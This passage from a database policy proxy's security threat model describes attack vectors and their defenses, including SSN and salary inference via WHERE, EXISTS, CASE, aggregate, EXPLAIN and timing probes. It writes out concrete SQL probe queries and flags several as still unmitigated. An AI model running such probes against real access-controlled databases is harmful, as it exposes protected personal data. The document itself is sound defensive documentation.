**Defense**: This is an *authorized* action, not a bypass — an admin with policy-write privileges can disable a deny policy by any mechanism (unassigning it, disabling it via `is_enabled = false`, or attaching a `fire: false` decision function). The defense is not prevention but **full traceability**:
- The policy mutation (attaching a decision function) is written to `admin_audit_log` inside the `AuditedTxn` (see vector 49). The entry records the `decision_function_id` change, the admin actor, and the before/after policy snapshot.
- At query time, every policy skip due to `fire: false` is recorded in `policies_applied` in the query audit log, with the full decision result attached. So every query that benefited from the bypass has a direct paper trail pointing back to both the admin action and the decision evaluation result.
- The semantics are intentional and match `is_enabled = false`: both are opt-out mechanisms that an admin is allowed to use.

**Tests**: Verified end-to-end via the audit log tests in vector 21 (`tc_audit_01_success_audit_status` confirms `policies_applied` is populated in audit rows) and the `AuditedTxn` tests in vector 49 (confirming policy mutations cannot escape the audit log). Specific behavioral coverage: `policy_enforcement::df_column_deny_visibility_fire_false` / `df_column_deny_visibility_fire_true` (vector 57) demonstrate that `fire: false` does skip the policy.

---

### 55. Corrupted WASM binary must not crash the proxy

**Vector**: A decision function's stored `decision_wasm` bytes become invalid — truncated on disk, bit-flipped in storage, manually edited in the DB, or produced by a broken compile pipeline. At query time, wasmtime fails to parse the module. A naive implementation that treats module instantiation as infallible would crash the proxy process on the failing query, taking down all active connections. Even a less drastic "fail loud with a panic" behavior would provide an amplification primitive for DoS.

**Attacks**:
  1. **Invalid WASM bytes in policy** — `decision_wasm` is `vec![0u8; 10]` (not a valid WASM binary); the proxy must handle the compile failure gracefully and apply the policy's `on_error` setting
  2. **Truncated valid module** — first half of a valid module only; same requirement

**Defense**: `Module::new(&engine, wasm_bytes)` in wasmtime returns `Result<Module, Error>` on parse/validation failure. `evaluate_wasm` catches the error as `RuntimeError::ExecutionError` and dispatches to the policy's `on_error` setting: `"deny"` fires the policy (fail-secure — the query is denied), `"skip"` skips it (policy is inert for this query). The error is logged via `tracing::error!` so the operator can see that a stored binary is broken. The query continues with the result of the `on_error` decision and the proxy does not crash. No panics, no unwraps, no `.expect()` on the compile result.

**Tests**:
  - `policy_enforcement::df_on_error_deny_fires` (integration) — attack 1 with `on_error = "deny"`
  - `policy_enforcement::df_on_error_skip_does_not_fire` (integration) — attack 1 with `on_error = "skip"`

---

### 56. Non-boolean `fire` return must be rejected

**Vector**: A decision function returns a truthy-but-non-boolean value for `fire` — e.g., `1`, `"yes"`, `{}`, `[]`, `null` — hoping that JavaScript truthiness conversion silently treats it as `true`. In a permit policy this would let any non-empty value grant access; in a deny policy it would let any non-empty value block access. Either way, policy decisions become dependent on JavaScript type coercion rules rather than explicit boolean logic, which is both subtle and easy to get wrong in ways that silently flip policy outcomes.

**Attacks**:
  1. **Numeric truthy** — `return { fire: 1 }`
  2. **String truthy** — `return { fire: "yes" }`
  3. **Null/undefined** — `return { fire: null }` or a function that never returns
  4. **Wrong shape entirely** — `return { wrong: "shape" }` (no `fire` field at all)

**Defense**: Two layers of strict type checking:
1. The Javy harness wraps the user function and validates the return shape before writing to stdout: `typeof result.fire !== 'boolean'` causes `throw new Error(...)`, which propagates as `RuntimeError::ExecutionError` and dispatches to `on_error`.
2. `evaluate_wasm` in Rust calls `.as_bool()` on the parsed JSON value, which returns `None` for any non-boolean (including JSON `null`, numbers, and strings). A `None` is converted to `RuntimeError::InvalidResult`.

Both layers reject non-boolean `fire` values independently — the JS harness catches most cases before the value crosses the sandbox boundary, and the Rust `.as_bool()` is the backstop.

**Tests**:
  - `decision::wasm::tests::test_validate_bad_return` (unit) — attacks 1, 2, 4

---

### 49. Admin mutations and their audit entries must be atomic

**Vector**: Every admin-facing mutation (role, policy, datasource, user, decision-function, attribute-definition CRUD) must record an audit row atomically with the data change — either both commit or neither does. Non-atomic patterns create three failure modes: (1) the mutation succeeds but the audit write fails, producing an unaudited change; (2) the audit write succeeds but the mutation fails, producing a phantom audit row for a change that didn't happen; (3) cache invalidation runs before the commit, exposing stale reads during the window between invalidation and commit.

**Attacks**:
  1. **Non-atomic mutation + audit** — any mutation handler that writes the entity on `&state.db` and the audit on `&state.db` in separate statements must be caught and rewritten
  2. **Empty-commit with no audit entries** — a handler that calls `AuditedTxn::commit()` without queuing any audit entries must return an error, not a silent empty commit
  3. **Cache invalidation before commit** — a handler that invalidates caches before `txn.commit()` returns must be caught, because concurrent reads in the invalidation window serve stale data then re-populate the cache with pre-commit state
  4. **Unaudited cascade** — `delete_role` must audit each cascaded policy-assignment deletion as `Unassign` before the cascade completes

**Defense**: All mutation handlers use `AuditedTxn` (from `admin_audit.rs`), a type-enforced wrapper around `DatabaseTransaction` that queues audit entries via `txn.audit(...)` and writes them atomically on `commit()`. Three invariants are enforced by the type system:
- Audit entries are queued *inside* the transaction and flushed during `commit()`, so they're atomic with the data change.
- `AuditedTxn::commit()` returns an error if no audit entries have been queued, preventing a mutation handler from accidentally skipping the audit.
- Dropping an `AuditedTxn` without committing rolls back both the data change and the queued audit entries.

The old `audit_delete` / `audit_insert` helpers that took a raw `&DatabaseConnection` have been removed, so the non-atomic pattern is unrepresentable. Cache invalidation is deliberately moved *after* `txn.commit()` in `remove_parent` and all other handlers that touch inheritance or access state.

**Previously**: Several handlers performed mutations and audit writes as separate statements on the raw `&state.db`, or called `audit_log()` after `txn.commit()` rather than inside the transaction. `create_role` and `update_role` wrote the mutation and the audit as two distinct non-atomic statements. `set_datasource_users` committed the mutation inside a transaction and then wrote the audit separately on `&state.db` — if the audit insert failed, the datasource change persisted with no record. `delete_role` failed to audit any cascaded policy-assignment deletions. `remove_parent` invalidated caches before `txn.commit()`, so a concurrent reader in the invalidation window would re-populate the cache with the pre-commit state.

**Tests**:
  - `admin::admin_audit::tests::audited_txn_commits_with_entries` (unit) — normal success path
  - `admin::admin_audit::tests::audited_txn_rejects_empty_commit` (unit) — attack 2 (empty commit returns error)
  - `admin::admin_audit::tests::audited_txn_rollback_on_drop` (unit) — dropping without committing rolls back both data and audit
  - `admin::admin_audit::tests::audited_txn_multiple_entries` (unit) — attack 4 (cascaded audit entries all commit atomically)

---

### 57. Visibility-level enforcement must evaluate decision functions on visibility-affecting policies

**Vector**: A `column_deny`, `column_allow`, or `table_deny` policy with a decision function attached must have the decision function evaluated at visibility time (i.e., during connection setup) if the function's `evaluate_context` is `"session"`. If the visibility-computation path ignores decision functions entirely, the policy fires unconditionally — meaning decision functions on visibility-affecting policies become inert, and every such policy is always applied regardless of what the function returns.

**Attacks**:
  1. **column_deny with session-context fire:false not skipped** — policy denies `ssn` with an attached session decision function that returns `fire: false`; the column must be visible in the user's query results because the decision function said "don't fire"
  2. **column_deny with session-context fire:true is applied** — same shape but fire:true; the column must be hidden (control case)
  3. **table_deny with session-context fire:false not skipped** — conditional `table_deny` with fire:false; the table must remain accessible

**Defense**: `compute_user_visibility()` loads decision functions for visibility-affecting policies (`policy_type.affects_visibility() == true`, covering `column_allow`, `column_deny`, `table_deny`), builds a session context with `build_session_context()`, and evaluates each decision function via `evaluate_visibility_decision_fn()`. If the function returns `{ fire: false }`, the policy is skipped at visibility time — the column stays in the schema, the table stays in the catalog. The shared `Arc<WasmDecisionRuntime>` is reused from `EngineCache` so there's no extra runtime construction per connection.

**Previously**: `compute_user_visibility()` loaded all assigned visibility-affecting policies and applied them unconditionally without ever consulting their decision functions. Decision functions on `column_allow`, `column_deny`, and `table_deny` were silently ineffective — the policies always fired as though no gate existed — so admins who tried to build "deny only if the user is outside business hours" or "allow only for analysts" conditional visibility policies saw no effect and had no indication that their decision functions were being ignored.

**Tests**:
  - `policy_enforcement::df_column_deny_visibility_fire_false` (integration) — attack 1
  - `policy_enforcement::df_column_deny_visibility_fire_true` (integration) — attack 2
  - `policy_enforcement::df_table_deny_conditional` (integration) — attack 3

---

### 58. Query-context decision functions on visibility-affecting policies must defer enforcement to query time

**Vector**: A `column_deny` (or other visibility-affecting) policy is configured with `evaluate_context = "query"`, meaning the decision function needs access to query metadata (table list, column list, statement type) that doesn't exist at connection time. The visibility-computation path must *not* evaluate the function at connect time with partial context — doing so would either produce the wrong result, force the decision function to handle a meaningless "empty query" context, or block connection setup while waiting for query metadata that won't arrive until the user runs a query.

**Attacks**:
  1. **Query-context decision function with fire:false must not be applied at visibility time, must be evaluated at query time** — `column_deny` with a query-context decision function returning `fire: false`; the column must stay in the schema at connect time (visibility-level effect skipped) and the query-time evaluation must return `fire: false` so the column is not denied at runtime either
  2. **Query-context decision function that depends on `ctx.query.username`** — conditional `column_deny` that fires only for non-admin users; non-admin users running the query see the column denied, admins see it

**Defense**: `evaluate_visibility_decision_fn()` short-circuits to `false` (skip visibility effect) when the decision function's `evaluate_context == "query"`. The policy is then enforced at query time by `PolicyEffects::collect()` via the defense-in-depth top-level `Projection` rewrite — where the full query context is available and the decision function can evaluate properly. This two-phase evaluation means query-context decision functions behave consistently: they never see partial context at visibility time, and they always see full context at query time.

**Tests**:
  - `policy_enforcement::df_column_deny_query_ctx_skipped_at_visibility` (integration) — attack 1
  - `policy_enforcement::df_column_deny_query_ctx_username_check_deferred` (integration) — attack 2

---

### 59. Predicate probing on masked or denied columns

**Vector**: A user who cannot see `ssn` values (because the column is masked or denied) uses `WHERE ssn = '...'` to test whether a specific SSN exists, enumerating values through observable row counts without ever seeing the raw column.

**Attacks**:
  1. **Bare WHERE probe** — `SELECT id FROM customers WHERE ssn = '123-45-6789'`
  2. **Correlated EXISTS probe** — `SELECT COUNT(*) FROM orders o WHERE EXISTS (SELECT 1 FROM customers c WHERE c.ssn = '123-45-6789' AND c.id = o.customer_id)`
  3. **VALUES-clause JOIN probe** — `SELECT c.id FROM customers c JOIN (VALUES ('123-45-6789')) AS v(ssn) ON c.ssn = v.ssn`

**Defense**: *Not yet implemented for column_deny.* Planned approach: denied column references appearing in `WHERE`, `JOIN`, or `EXISTS` predicates are rejected at plan-rewrite time or rewritten to `lit(false)`, preventing the probe from returning observable row-count signals. For `column_mask`, the raw column remains accessible in predicate positions by design — the mask only affects projection output — so predicate probing against masked columns is an accepted trade-off (see Status).

**Status**: *Unmitigated for column_deny* — denied-column predicate blocking is tracked as a TODO. *Accepted trade-off for column_mask* — use `column_deny` for columns where predicate probing must also be blocked.

**Tests**: *None — see Status*

---

### 60. Aggregate inference on masked or denied columns

**Vector**: User applies aggregate functions to masked or denied columns hoping to extract statistical properties that the raw-value suppression was intended to hide. Cardinality (`COUNT(DISTINCT`), range (`MIN`/`MAX`), and group structure (`GROUP BY`) can each leak identifying information even when individual values are hidden.

**Attacks**:
  1. **COUNT(DISTINCT masked)** — `SELECT COUNT(DISTINCT ssn) FROM customers`; must operate on masked values (collapsed cardinality), not raw
  2. **MIN/MAX on masked numeric** — `SELECT MIN(salary), MAX(salary) FROM employees`; must return masked bounds, not raw
  3. **COUNT(DISTINCT denied)** — same query, `ssn` denied; must error at plan time (column not in schema)
  4. **MIN/MAX on denied numeric** — same, `salary` denied; must error at plan time
  5. **GROUP BY with small groups** — `SELECT department, COUNT(DISTINCT ssn), MIN(salary), MAX(salary) FROM employees GROUP BY department`; for a department of size 1, MIN=MAX on a mask reveals the masked value but not the raw

**Defense**: For `column_mask`, masks are applied at `TableScan` level via `apply_column_mask_at_scan` — every aggregate operates on masked values, so `COUNT(DISTINCT)` collapses to the cardinality of the mask's range (1 for constant masks), and `MIN`/`MAX` return the bounds of the masked distribution. The raw values never leave the scan, so aggregation cannot recover them. For `column_deny`, the column is stripped from the schema entirely and any aggregate referencing a denied column fails at plan time with a column-not-found error.

**Status**: *Accepted trade-off for column_mask* — mask-preserving aggregates still leak statistical properties proportional to the mask's information content (last-4-digit masks leak more than constant masks). Admins should use `column_deny` for high-sensitivity columns where even aggregate inference must be blocked.

**Tests**:
  - `policy_enforcement::aggregate_count_distinct_on_masked_column` (integration) — attack 1
  - `policy_enforcement::aggregate_min_max_on_masked_column` (integration) — attack 2
  - `policy_enforcement::aggregate_count_distinct_on_denied_column` (integration) — attack 3
  - `policy_enforcement::aggregate_min_max_on_denied_column` (integration) — attack 4

---

### 61. EXPLAIN plan metadata leakage

**Vector**: User runs `EXPLAIN` or `EXPLAIN ANALYZE` on a query, and the plan output — which is returned to the user as a result set — reveals policy internals that the user should not see. The query plan acts as a side channel exposing the shape of row filters, the existence of columns that are otherwise hidden by `column_deny`, and (depending on the error path) table names hidden by `table_deny`.

**Attacks**:
  1. **Row filter expression leaked** — `EXPLAIN SELECT * FROM orders` with an active `row_filter` on the user's tenant; the plan output shows `Filter: organization_id = 'tenant-123'`, revealing both the filter column and the user's own tenant value (which may itself be sensitive)
  2. **Column visibility probe** — `EXPLAIN SELECT * FROM customers` with a `column_deny` on `ssn`; the expanded column list in the plan reveals whether `ssn` exists at all
  3. **Table existence probe via EXPLAIN error** — `EXPLAIN SELECT * FROM secret_table` where `secret_table` is blocked by `table_deny`; error-message equivalence (vector 26) must also hold for the EXPLAIN path

**Defense**: *Not yet implemented.* Planned approach: one or a combination of — (a) strip injected filter expressions and mask expressions from EXPLAIN output before returning it to non-admin users; (b) block `EXPLAIN`/`EXPLAIN ANALYZE` entirely for non-admin users via the hook chain; (c) return a sanitized plan that shows the user's *logical* query structure without the proxy's rewrites. Needs investigation into exactly what DataFusion's `EXPLAIN` exposes at each verbosity level and whether sanitization can be done post-hoc on the output string.

**Status**: *Unmitigated* — EXPLAIN output sanitization is tracked as a TODO. Deployments that need strict metadata hiding should disable EXPLAIN via the allowlist in `ReadOnlyHook` until a proper sanitizer is implemented.

**Tests**: *None — see Status*

---

### 62. HAVING clause on masked or denied column

**Vector**: User places an aggregate-based predicate in a `HAVING` clause referencing a masked or denied column, hoping the grouping filter evaluates against raw values (revealing which groups contain high earners, specific individuals, etc.) even though the column is masked in the `SELECT` output.

**Attacks**:
  1. **HAVING on masked column (constant mask)** — `SELECT department FROM employees GROUP BY department HAVING MAX(salary) > 100000` where `salary` is masked to `0`; must return zero rows (HAVING sees masked zero, not raw salary)
  2. **HAVING on masked column (derived mask)** — same query with a `last-two-digits` mask; must return zero rows for the `> 100000` threshold and `SELECT dept, MAX(salary) ... GROUP BY dept` must return the per-row masked maximum, not the raw
  3. **HAVING on denied column** — `HAVING MAX(salary) > 100000` where `salary` is denied; must error at plan time (column not in schema)

**Defense**: `column_mask` is applied at `TableScan` level via `apply_column_mask_at_scan`, so the mask `Projection` sits directly above the scan. Every downstream plan node — including the aggregation feeding `HAVING` — operates on the masked value. DataFusion's plan rewrite propagates the masked column reference through the aggregation, so `MAX(salary)` becomes `MAX(mask_expr)` and `HAVING` evaluates against the masked aggregate. `column_deny` removes the column from the schema entirely, so any `HAVING` clause referencing it fails at plan time.

**Tests**:
  - `policy_enforcement::having_clause_on_masked_column_constant_mask` (integration) — attack 1
  - `policy_enforcement::having_clause_on_masked_column_derived_mask` (integration) — attack 2
  - `policy_enforcement::having_clause_on_denied_column` (integration) — attack 3

---

### 63. String aggregation on masked or denied column

**Vector**: User calls `STRING_AGG` (or similar collecting aggregate) on a masked or denied column, hoping to collect bulk raw values into a single concatenated string that bypasses row-level display restrictions. Even for partially-masked columns (e.g. last-4 digits), bulk collection combined with other columns (names, IDs) can enable re-identification.

**Attacks**:
  1. **STRING_AGG on masked column** — `SELECT string_agg(ssn, ',') FROM customers` where `ssn` is masked; must concatenate masked values only, never raw. The rewritten query sent to upstream Postgres must also contain only masked values (aggregate pushdown must not leak raw data upstream).
  2. **STRING_AGG on denied column** — same shape, `ssn` denied; must error at plan time

**Defense**: For `column_mask`, the mask `Projection` sits directly above the `TableScan`, so `STRING_AGG` operates on masked values throughout — whether DataFusion computes the aggregate locally or pushes it down to upstream Postgres via `SqlExec`, the unparsed SQL references the mask expression, not the raw column. For `column_deny`, the column is removed from the schema at visibility time; any `STRING_AGG(denied_col, ...)` reference fails at plan time with column-not-found.

**Status**: *Accepted trade-off for column_mask* — bulk collection of masked values is an inherent property of masking (any aggregate the user can run, they can run on masked values). Rate limiting and query-pattern auditing are the appropriate mitigations; masks alone cannot prevent bulk inference when the mask preserves partial information.

**Tests**:
  - `policy_enforcement::string_agg_on_masked_column` (integration) — attack 1 (includes pushdown introspection: asserts `rewritten_query` in `/api/v1/audit/queries` contains no raw SSN substring)
  - `policy_enforcement::string_agg_on_denied_column` (integration) — attack 2

---

### 64. CASE expression bypass of column_deny

**Vector**: User embeds a denied column inside a `CASE` expression (or any compound expression) in the `SELECT` list. The returned value is a derived label that exposes information about the raw column without naming it directly, effectively smuggling a `WHERE` probe into the projection.

**Attacks**:
  1. **Existence probe via CASE** — `SELECT CASE WHEN ssn IS NOT NULL THEN 'has_ssn' ELSE 'no_ssn' END FROM customers` where `ssn` is denied; reveals per-row whether the column has a value
  2. **Prefix match probe via CASE** — `SELECT CASE WHEN ssn LIKE '123%' THEN 'match' ELSE 'no' END FROM customers`; equivalent to a WHERE probe embedded in the projection
  3. **Indirect reference via COALESCE or function call** — `SELECT COALESCE(ssn, 'none') FROM customers` or `SELECT LENGTH(ssn) FROM customers`

**Defense**: *Not yet fully implemented.* Current behavior: the deny engine strips denied column names from the top-level `Projection` expression list, but does not recursively trace column references through compound expressions (`CASE`, `COALESCE`, function arguments). A rigorous defense must walk the entire expression tree via `Expr::column_refs()` and reject any expression whose dependency set contains a denied column, mirroring the "column reference" policy applied to bare column selections.

**Status**: *Unmitigated* — recursive expression-tree denial is tracked as a TODO. `column_deny` currently protects against direct column references only.

**Tests**: *None — see Status*

---

### 65. Window function ordering leaks masked column ranking

**Vector**: User applies a window function whose `ORDER BY` clause references a masked column, hoping the window's ordering operates on raw values while the projection output shows masked values. The `ROW_NUMBER` / rank output then reveals the relative ordering of raw values, which combined with a few known values enables re-identification.

**Attacks**:
  1. **ROW_NUMBER over masked column (constant mask)** — `SELECT id, ROW_NUMBER() OVER (ORDER BY salary) FROM employees` where `salary` is masked to `0`; all rows see tied masked values, `rn` is a permutation (ordering undefined), projected salary is `0`
  2. **ROW_NUMBER over masked column (derived mask)** — salaries `12340/56781/9002` for ids `1/2/3`, mask is `last digit` producing `0/1/2`. Raw `ORDER BY` would assign `rn` as `2/3/1` per id; masked `ORDER BY` assigns `1/2/3`. The assertion must match the masked ordering exactly — any divergence means the window function saw raw values
  3. **ROW_NUMBER over denied column** — same query with `salary` denied; must error at plan time

**Defense**: The mask `Projection` sits directly above the `TableScan` in the plan tree. Every downstream plan node — including `Window` nodes and their `ORDER BY` expressions — resolves `salary` to the masked expression, not the raw column. DataFusion's planner binds the window function's column reference to the output of the mask projection, so the sort key used by the window function is the masked value. For `column_deny`, the column is removed from the schema and any window `ORDER BY` referencing it fails at plan time.

**Tests**:
  - `policy_enforcement::window_row_number_order_by_masked_column_constant_mask` (integration) — attack 1
  - `policy_enforcement::window_row_number_order_by_masked_column_derived_mask` (integration) — attack 2 (definitive: the derived mask produces a different ordering than raw, and the asserted mapping is the masked one)
  - `policy_enforcement::window_row_number_order_by_denied_column` (integration) — attack 3

---

### 66. Timing side channel on denied tables

**Vector**: Even if the error *message* for a denied table is indistinguishable from a genuinely non-existent table (vector 26), the *response time* might differ enough to let an attacker distinguish "exists but denied" from "does not exist." For example, an early-exit path for denied tables that short-circuits before planning would return faster than a planner error for a missing table.

**Attacks**:
  1. **Timing probe** — attacker measures response time for queries against suspected table names (both denied and non-existent), looking for a measurable distribution difference

**Defense**: `table_deny` removes the table from the per-user catalog at connection time, so queries against a denied table take the same planner code path as queries against a genuinely non-existent table — the planner performs a catalog lookup, fails to find the table, and returns a plan error. There is no "denied-table early exit" that would create an observable timing divergence. The invariant is a design principle: no code path may short-circuit on `table_deny` in a way that produces a different latency profile from a missing-table lookup.

**Status**: *Accepted trade-off* — timing-channel equivalence is difficult to verify automatically because measurements are noisy and platform-dependent. The defense is enforced by code review: any change that adds an early-exit path for denied tables must be caught at review time. Error-message equivalence (the high-bandwidth side channel) is covered by vector 26 and is tested automatically.

**Tests**: *None directly for timing* — covered transitively by vector 26 for error-message equivalence (`policy_enforcement::deny_policy_row_filter_rejected`, `policy_enforcement::tc_audit_02_denied_audit_status`).

---

## ABAC (User Attributes) — Vectors 67–68

### 67. Attribute-based built-in field override

**Vector**: Admin defines a user attribute whose key collides with a reserved built-in field name (`username`, `id`, `user_id`, `roles`), hoping to override `{user.username}` or `{user.id}` in policy expressions and impersonate another user — either by setting their own attribute to another user's username, or by leveraging role membership to control an attribute the policy author never intended to be user-controlled.

**Attacks**:
  1. **Reserved attribute key at API layer** — create an attribute definition with `key = "username"` and `entity_type = "user"`; must return HTTP 422
  2. **Runtime built-in priority** — even if a reserved-name attribute somehow existed in the `attributes` JSON column (bypassing the API, e.g., via direct DB edit), `{user.username}` and `{user.id}` must resolve to the authenticated user's actual username/ID, not the attribute value

**Defense**: Two independent layers:
1. **API validation**: `validate_attribute_definition` in `attribute_definition_handlers.rs` rejects reserved key names (`username`, `id`, `user_id`, `roles`) for `entity_type = "user"`. The attribute definition cannot be persisted in the first place.
2. **Runtime priority**: `UserVars::get()` uses a `match` statement where built-in fields are checked first, before any custom-attribute lookup. Even if a reserved-name attribute exists in the JSON column, the built-in always wins.

Note: `tenant` is *not* a reserved key — it's a regular custom attribute. `{user.tenant}` resolves from the user's attributes via the attribute definition system. The security control for tenant isolation is that only admins can set user attributes, not the attribute key being reserved.

**Tests**:
  - `policy_enforcement::abac_builtin_field_override_security` (integration) — attack 1 (API rejects `username` as attribute key with 422)
  - `hooks::policy::tests::test_user_vars_builtin_priority_over_attributes` (unit) — attack 2 (`UserVars::get()` returns the built-in value even when a conflicting attribute is injected into the JSON)

---

### 68. Unsupported mask or filter expression syntax fails silently

**Vector**: Admin configures a policy whose `mask_expression` or `filter_expression` uses SQL syntax that the proxy's expression parser does not support (e.g., `EXTRACT`, legacy `SUBSTRING` variants, correlated subqueries). A parse failure at query time silently dropping the policy would cause sensitive columns to return raw values while the admin believes the mask is in effect.

**Attacks**:
  1. **Unsupported function in mask** — policy with `mask_expression = "EXTRACT(HOUR FROM created_at)"` saved successfully; at query time the parse fails and the raw column is returned
  2. **Newly-supported expression form** — `CASE WHEN` expressions must round-trip through parse and application (previously unsupported, now supported — regression-guarded)

**Defense**: `validate_expression()` is called at policy create/update time (inside `validate_definition()` in `dto.rs`). It dry-run parses the expression with dummy user variables via the same `sql_ast_to_df_expr` used at query time. Unsupported syntax returns HTTP 422 immediately — the policy is never persisted. At query time, the defensive-fallback swallowing behavior in `PolicyEffects::collect()` remains, but in practice only already-validated expressions reach query time. The two layers together prevent any silently-dropped mask from leaking raw values.

**Previously**: `parse_mask_expr` errors were logged but swallowed inside `PolicyEffects::collect()`. A policy with unsupported syntax would save successfully (no save-time validation existed) and then silently fail to apply at query time — the mask was never inserted into `column_masks`, and the raw column value passed through to the result set. The admin had no indication that the policy was inert.

**Tests**:
  - `policy_enforcement::abac_column_mask_case_when` (integration) — attack 2 (regression test for a previously-unsupported syntax that now works end-to-end)
  - Save-time validation tests in `admin::dto::tests::validate_filter_expression_*` cover attack 1's general shape (unsupported syntax → 422 at save)

---

### 69. Zero-column scan projection must not crash downstream SQL pushdown

**Vector**: Queries that don't reference any table columns (e.g. `SELECT COUNT(*) FROM t`, `SELECT COUNT(1) FROM t`, `SELECT 1 FROM t`) are optimized by DataFusion 52+ to `TableScan(projection = Some([]))` — zero columns projected. The `datafusion-table-providers` crate's `SqlExec` then generates upstream SQL of the form `SELECT 1 FROM t` and returns a 1-column physical schema (`ONE_COLUMN_SCHEMA`), but the logical plan expects 0 columns. The physical/logical schema mismatch causes an execution-time error, breaking every zero-column query. This isn't a security bypass but a reliability/DoS: an attacker (or a legitimate user) writing `SELECT COUNT(*)` denies themselves service.

**Attacks**:
  1. **COUNT(\*) with no policies** — `SELECT COUNT(*) FROM orders` on an open-mode datasource with no policies assigned
  2. **COUNT(\*) with column_allow only** — same query in `policy_required` mode with a `column_allow` policy (no `row_filter`)
  3. **COUNT(\*) with column_deny** — same with `column_deny` on any column
  4. **COUNT(\*) with column_mask** — same with `column_mask`
  5. **COUNT(\*) over a JOIN** — `SELECT COUNT(*) FROM a JOIN b ON ...` where the outer SELECT references no columns

**Defense**: `EmptyProjectionFixRule` is registered on every `SessionContext` as a DataFusion optimizer rule. It walks the plan tree and converts any `TableScan(projection = Some([]))` to `TableScan(projection = Some([0]))` — selecting at least the first column. Parent nodes (e.g., `Aggregate` computing `COUNT(*)`) never reference scan columns in this situation, so the extra column is harmless at the aggregation level but satisfies `SqlExec`'s 1-column physical-schema expectation.

**Previously**: No optimizer rule prevented zero-column projections from reaching `SqlExec`. The pre-existing `ScanFilterProjectionFixRule` only fired when pushed-down filters were present (it existed to handle a related projection-expansion issue — see vector 25), so queries without filters (or without row_filter policies) fell straight into the mismatch and errored at execution time. Every `SELECT COUNT(*)` against a filter-less table failed.

**Tests**:
  - `policy_enforcement::count_star_open_mode_no_policies` (integration) — attack 1
  - `policy_enforcement::count_star_with_column_allow_only` (integration) — attack 2
  - `policy_enforcement::count_star_with_column_deny` (integration) — attack 3
  - `policy_enforcement::count_star_with_column_mask` (integration) — attack 4
  - `policy_enforcement::count_star_with_join` (integration) — attack 5

---

### 70. Missing user attributes must not silently fall back to empty string

**Vector**: A row filter or mask expression references `{user.tenant}`, but the queried user has no `tenant` attribute set. A silent fallback to empty string produces `WHERE tenant = ''` — which either leaks rows where `tenant` happens to be empty (for tenants with blank names, or for legacy rows written before tenant tagging) or returns silent empty results that look like "no data" instead of "policy misconfigured." In a decision function context, the same situation manifests as `undefined` in JavaScript, where comparisons like `user.clearance >= 0` silently evaluate to `false`, again failing closed but without any signal that the attribute was missing.

**Attacks**:
  1. **Missing attribute with defined default** — row filter `tenant = {user.tenant}`, user has no `tenant` attribute, attribute definition has `default_value = "public"`; substitution must use `"public"`
  2. **Missing attribute with NULL default** — same shape with `default_value = NULL`; substitution must produce SQL `NULL` (which returns zero rows for `=` comparison, failing closed)
  3. **Missing attribute with no definition** — `{user.nonexistent}` where no attribute definition exists; must return an error, not substitute empty string
  4. **Missing attribute in decision function** — decision function reads `ctx.session.user.clearance`; if missing with NULL default, it must appear as JSON `null` (distinguishable from `undefined`), not omit the field entirely
  5. **Present attribute ignores default** — user has the attribute set; the default is never applied

**Defense**: `resolve_user_attribute_defaults()` in `hooks/policy.rs` merges user attributes with their definition defaults. Missing attributes with a non-NULL `default_value` get that value substituted as a typed literal (Utf8 / Int64 / Boolean, matching the definition's `value_type`). Missing attributes with a NULL default get SQL `NULL` (and JSON `null` in decision contexts). References to attributes with no definition at all return an error instead of silently substituting empty string. The helper is the single source of truth and is called in all three substitution paths: `mangle_vars()` (row filters + masks), query-level decision context (`handle_query`), and visibility-level decision context (`build_typed_json_attributes`).

**Previously**: `mangle_vars()` used `unwrap_or("")` for missing attributes — no error, no warning, no telemetry. Decision function context omitted missing attributes entirely (they appeared as `undefined` in JS), causing expressions like `user.clearance >= 0` to silently evaluate to `false`. Admins who misspelled an attribute key or forgot to set a default saw silently-empty result sets with no indication that their policy was misconfigured, and users who lacked a required attribute got either "no data" or (worse) rows matching the empty-string sentinel.

**Tests**:
  - `hooks::policy::tests::test_mangle_vars_missing_attr_with_default` (unit) — attack 1
  - `hooks::policy::tests::test_mangle_vars_missing_attr_null_default` (unit) — attack 2
  - `hooks::policy::tests::test_mangle_vars_missing_attr_no_definition` (unit) — attack 3
  - `hooks::policy::tests::test_mangle_vars_missing_attr_default_integer` (unit) — attack 1 (integer type)
  - `hooks::policy::tests::test_mangle_vars_missing_attr_default_list` (unit) — attack 1 (list type)
  - `hooks::policy::tests::test_mangle_vars_present_attr_ignores_default` (unit) — attack 5
  - `hooks::policy::tests::test_resolve_user_attribute_defaults` (unit) — shared helper coverage
  - `policy_enforcement::row_filter_missing_attr_uses_default` (integration) — attack 1 end-to-end
  - `policy_enforcement::row_filter_missing_attr_null_default` (integration) — attack 2 end-to-end
  - `policy_enforcement::row_filter_attr_present_ignores_default` (integration) — attack 5 end-to-end
  - `policy_enforcement::column_mask_missing_attr_uses_default` (integration) — attack 1 for masks
  - `policy_enforcement::column_mask_missing_attr_null_default` (integration) — attack 2 for masks
  - `policy_enforcement::decision_fn_missing_attr_uses_default` (integration) — attack 4

---

### 71. Policy bypass via unqualified table reference

**Vector**: A policy targets a specific schema (e.g. `schemas: ["public"]`), and tables live in the `public` schema upstream. A user queries with an unqualified table reference (`SELECT * FROM orders` instead of `SELECT * FROM public.orders`). If the policy matcher treats the scan's `schema` field as the empty string for bare references (because DataFusion parses `"orders"` as `TableReference::Bare { table: "orders" }` with no schema component), the matcher compares `""` against `"public"`, fails to find a match, and silently skips the policy — the user gets all rows unfiltered. This affects **all five policy types** (`row_filter`, `column_mask`, `column_deny`, `column_allow`, `table_deny`) because they all consume the same `user_tables` vector.

**Attacks**:
  1. **Bare reference with row_filter policy** — `SELECT * FROM orders` against a policy with `schemas: ["public"]` row filter; must apply the filter
  2. **Bare reference with column_mask policy** — same shape with a column mask; mask must apply
  3. **Bare reference with column_deny policy** — same with deny; column must be stripped
  4. **Bare reference with column_allow in policy_required mode** — `column_allow` must still grant visibility (symmetric fail-closed case)
  5. **Bare reference with table_deny + query-context decision function** — `table_deny` with `evaluate_context = "query"` (visibility-layer is skipped per vector 58, so enforcement depends entirely on the query-time code path); bare reference must still hit the deny
  6. **Bare reference inside CTE wrapping** — combines vectors 4 and 71: `WITH t AS (SELECT * FROM orders) SELECT * FROM t`; must still apply the policy
  7. **Three-part reference with datasource catalog** — new capability (from vector 72) where `SELECT ... FROM ds_name.public.orders` must apply the same policies as the bare reference

